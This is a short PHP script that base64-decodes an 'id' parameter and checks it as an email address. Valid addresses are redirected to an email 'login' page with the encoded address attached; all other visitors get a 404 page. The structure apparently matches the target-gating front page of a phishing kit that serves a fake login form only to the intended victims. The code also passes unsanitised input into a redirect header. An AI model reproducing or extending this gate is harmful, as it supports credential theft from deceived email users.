<?php

session_start();

require '../api.php';

if (isset($_GET['id'])) {
$id = $_GET['id'];
}
$em = base64_decode($id);
if (filter_var($em, FILTER_VALIDATE_EMAIL)) {
    header ("Location: login/?app=email&realm=pass&path=$id&err=0");
}

else{
     include '../404.php';

}

?>